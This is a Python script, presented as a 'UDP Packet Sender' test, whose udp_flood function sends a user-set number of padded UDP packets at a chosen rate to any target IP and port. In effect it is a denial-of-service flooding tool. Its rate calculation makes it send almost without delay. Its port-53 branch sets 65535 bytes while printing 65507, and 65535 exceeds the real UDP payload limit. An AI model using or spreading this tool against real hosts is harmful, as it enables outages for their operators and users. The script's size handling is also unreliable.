import socket
import time
import threading

def udp_flood(ip, port, message, pps, packet_count, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Prepare payload to match the specified packet size
    encoded_msg = message.encode()
    if len(encoded_msg) > packet_size:
        payload = encoded_msg[:packet_size]  # Truncate
    else:
        padding = b' ' * (packet_size - len(encoded_msg))
        payload = encoded_msg + padding      # Pad

    interval = 0.0001 / pps
    sent = 0

    print(f"\n🚀 Sending {packet_count} UDP packets to {ip}:{port} at {pps} PPS")
    print(f"📦 Each packet is {packet_size} bytes\n")

    def send_loop():
        nonlocal sent
        while sent < packet_count:
            try:
                sock.sendto(payload, (ip, port))
                sent += 1
                time.sleep(interval)
            except Exception as e:
                print(f"Error: {e}")
                break

    thread = threading.Thread(target=send_loop)
    thread.start()
    thread.join()
    sock.close()
    print(f"✅ Sent {sent} packets. UDP test complete.")

if __name__ == "__main__":
    print("=== UDP Packet Sender ===")
    target_ip = input("Enter target IP address: ").strip()
    target_port = int(input("Enter target port: ").strip())
    message = input("Enter message to send: ").strip()
    pps = int(input("Enter packets per second (PPS): ").strip())
    packet_count = int(input("Enter number of packets to send: ").strip())

    # Define custom packet size rules
    if target_port == 53:
        packet_size = 65535
        print("📏 Port 53 detected — setting packet size to 65507 bytes (DNS-safe)")
    elif target_ip == "192.168.1.10":
        packet_size = 65507
        print("📏 IP 192.168.1.10 detected — setting packet size to 65507 bytes")
    else:
        print("ℹ️  Recommended max: 1472 bytes (to avoid fragmentation)")
        packet_size = int(input("Enter packet size in bytes: ").strip())

    # Enforce protocol max
    if packet_size > 65535:
        print("❌ Error: Maximum UDP payload size is 65535 bytes.")
    else:
        udp_flood(target_ip, target_port, message, pps, packet_count, packet_size)
